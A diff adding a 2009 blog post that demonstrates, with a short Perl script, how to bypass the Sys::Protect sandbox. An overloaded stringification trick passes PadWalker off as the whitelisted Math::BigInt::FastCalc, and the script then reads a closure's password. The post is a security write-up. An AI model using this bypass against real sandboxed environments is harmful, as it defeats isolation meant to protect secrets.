@@ -1,0 +1,32 @@
+title: Breaking Sys::Protect
+date: 2009-03-25
+
+<p><a href="http://p3rl.org/Sys::Protect">Sys::Protect</a> does not bill itself as unbreakable protection, but it's fun to break it anyway.</p>
+
+<p><a href="http://p3rl.org/PadWalker">PadWalker</a> is used as an example of an XS module that could seriously mess with other code. <a href="http://p3rl.org/Math::BigInt::FastCalc">Math::BigInt::FastCalc</a> is specifically allowed by Sys::Protect to perform unsafe operations because its domain is only big integers, it is used by a lot of other modules, and because its XS code has been verified to be safe.</p>
+
+<blockquote><tt>
+#!/usr/bin/env perl<br>
+no strict;<br>
+use warnings;<br>
+use Sys::Protect;<br>
+use Test::More tests =&gt; 1;<br>
+<br>
+XSLoader::load(bless {}, 'Break::Sys::Protect');<br>
+<br>
+my $password = 'c53eb8f992b4fdf70a03a4d437820028';<br>
+my $authenticate = sub { shift eq $password };<br>
+is(${PadWalker::closed_over($authenticate)-&gt;{'$password'}}, $password);<br>
+<br>
+package Break::Sys::Protect;<br>
+use overload q{""} =&gt; sub {<br>
+&nbsp; &nbsp; return "Math::BigInt::FastCalc"<br>
+&nbsp; &nbsp; &nbsp; &nbsp; if caller eq 'Sys::Protect';<br>
+<br>
+&nbsp; &nbsp; $_[0] = "PadWalker";<br>
+};
+</tt></blockquote>
+
+<p>Don't use Sys::Protect. :)</p>
+
+<p>edit: I've been told by Sys::Protect's authors that it is a proof of concept for testing Perl code under environments similar to what Google App Engine supports. Such a platform would presumably remove the dangerous opcodes entirely.</p>
